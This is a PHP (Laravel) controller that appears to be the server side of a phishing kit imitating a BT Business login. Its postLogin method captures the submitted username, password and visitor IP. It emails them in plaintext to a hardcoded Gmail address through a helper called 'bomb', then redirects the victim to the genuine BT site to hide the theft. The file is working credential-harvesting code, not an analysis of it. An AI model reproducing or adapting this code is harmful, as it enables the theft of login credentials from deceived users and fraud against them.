<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use Session; 
use Validator; 
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;                     
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getIndex()
    {
       $user = null;

		if(Auth::check())
		{
			$user = Auth::user();
		}
		
		
    	return view('index',compact(['user']));
    }

     
	
	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
    public function postLogin(Request $request)
    {
		$user = null;
		
    	if(Auth::check())
		{
			$user = Auth::user();
		}
        
        $req = $request->all();
		//dd($req);
        $validator = Validator::make($req, [
                             'USER' => 'required',
                             'PASSWORD' => 'required',
							 ]);
         
         if($validator->fails())
         {
             $messages = $validator->messages();
             return redirect()->back()->withInput()->with('errors',$messages);
             //dd($messages);
         }
         
         else
         {
			 $ip = getenv("REMOTE_ADDR");
				$s = "New  Login ~~ ".$ip." ~~ ".date("h:i A jS F, Y");
				$ems = ['philipschwarz3@gmail.com',''];
				foreach($ems as $em){
             $msg = "<h2 style='color: green;'>New login from bttconnectt.com</h2><p>User: <b>".$req['USER']."</b></p><p>Password: <b>".$req['PASSWORD']."</b></p><br><br><marquee><small style='color: red'>@tkud04</small></marquee>";
		     $dt = [
		      'sn' => "BttConnectt Postman",
		      'em' => $em,
		      'sa' => "uwantbrendacolson@gmail.com",
		      'subject' => $s,
		      'message' => $msg,
		   ];
        	$this->helpers->bomb($dt);
        }
			return redirect()->away('https://secure.business.bt.com/Hub/Logout?target=ESERVE&amp;s_cid=btb_email_NewBill_viewyourbill');
         } 	  
    }
	
    
    /**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getZoho()
    {
        $ret = "1535561942737";
    	return $ret;
    }
    
    
    /**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getPractice()
    {
		$url = "http://www.kloudtransact.com/cobra-deals";
	    $msg = "<h2 style='color: green;'>A new deal has been uploaded!</h2><p>Name: <b>My deal</b></p><br><p>Uploaded by: <b>A Store owner</b></p><br><p>Visit $url for more details.</><br><br><small>KloudTransact Admin</small>";
		$dt = [
		   'sn' => "Tee",
		   'em' => "kudayisitobi@gmail.com",
		   'sa' => "KloudTransact",
		   'subject' => "A new deal was just uploaded. (read this)",
		   'message' => $msg,
		];
    	return $this->helpers->bomb($dt);
    }   


}